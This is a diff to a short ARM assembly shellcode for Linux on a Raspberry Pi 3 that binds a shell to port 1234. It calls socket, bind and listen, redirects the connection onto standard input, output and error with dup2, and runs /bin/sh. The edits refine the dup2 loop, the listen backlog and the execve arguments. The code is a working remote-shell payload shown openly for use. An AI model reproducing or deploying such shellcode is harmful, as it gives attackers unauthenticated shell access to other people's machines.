@@ -1,7 +1,7 @@
 /**
   bind shell to port 1234
   tested with linux running on raspberry pi 3  
-
+ 
   http://modexp.wordpress.com/   
 */
 
@@ -36,7 +36,7 @@ _start:
     add    r7, #1       // r7 = 281+1 = 282 = bind
     svc    1
   
-    // listen(s, 0);
+    // listen(s, 1);
     mov    r1, #1       // r1 = 1    
     mov    r0, r8       // r0 = s
     add    r7, #2       // r7 = 282+2 = 284 = listen 
@@ -54,18 +54,17 @@ _start:
     // dup2(r, FILENO_STDIN);
     // dup2(r, FILENO_STDOUT);
     // dup2(r, FILENO_STDERR);
-    mov    r1, #2       // for 3 descriptors
+    mov    r1, #3       // for 3 descriptors
 c_dup:
     mov    r7, #63      // r7 = dup2 
     mov    r0, r8       // r0 = r
+    sub    r1, #1 
     svc    1
-    sub    r1, #1       // 
-    bpl    c_dup        // while (r1 >= 0)
+    bne    c_dup        // while (r1 != 0)
 
     // execve("/bin/sh", NULL, NULL);
-    push   {r5, r6, r9}    
+    mov    r7, r2 
+    push   {r5, r6, r7}    
     mov    r0, sp       // r0 = "/bin/sh" 
-    eor    r2, r2, r2   // r2 = NULL
-    eor    r1, r1, r1   // r1 = NULL
     mov    r7, #11      // r7 = execve
     svc    1
